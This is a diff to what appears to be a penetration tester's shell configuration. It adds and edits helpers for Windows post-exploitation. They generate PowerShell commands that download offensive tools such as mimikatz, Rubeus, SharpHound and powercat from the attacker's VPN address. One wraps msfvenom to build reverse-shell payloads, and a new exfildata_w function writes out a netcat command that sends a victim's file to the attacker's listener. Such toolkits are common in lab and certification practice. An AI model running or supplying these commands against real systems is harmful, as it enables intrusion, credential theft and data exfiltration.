@@ -1,3 +1,4 @@
+
 alias cpclip="xclip -selection clipboard"
 export LIP="$(ifconfig tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')"
 alias getb64win="python3 -c \"import base64;print(base64.b64encode(input().encode('utf-16le')).decode())\""
@@ -7,23 +8,32 @@ iwruri() {echo "iwr -uri http://$LIP/$1 -outfile C:\TEMP"'\\'"$1"}
 
 # Usage: iwruribins | cpclip
 bins=("SharpHound.ps1"
-"Mimikatz.exe"
+"mimikatz.exe"
 "PrintSpoofer.exe"
 "chisel.exe"
 "nc.exe"
 "PowerView.ps1"
-"Rubeus.exe")
+"winPEASx64.exe"
+"Rubeus.exe"
+"powercat.ps1")
 iwruribins() {for bin in "${bins[@]}"; do iwruri "$bin"; done};
 
 # Usage: msfport 4444 exe -p windows/shell_reverse_tcp
 msfport() {
-baseargs="LHOST=$LIP LPORT=$1 -f $2 -o s$1.$2"
-shift 2 
-msfvenom $baseargs $@
+	baseargs="LHOST=$LIP LPORT=$1 -f $2 -o s$1.$2"
+	shift 2 
+	cmd="msfvenom $baseargs $@"
+	eval "$cmd"
 }
 
 # Usage: iwrmsfport 4444 exe -p windows/shell_reverse_tcp | cpclip
 iwrmsfport() {
-msfport $@
-iwruri s$1.$2;
+	msfport $@
+	iwruri s$1.$2;
+}
+
+# Usage: iwrmsfport mimi.txt
+exfildata_w() {
+  echo cmd.exe /c '"'"C:\TEMP"'\\'"nc.exe $LIP 9999 < $1"'"' |cpclip
+	nc -lvp 9999 > $1;
 }
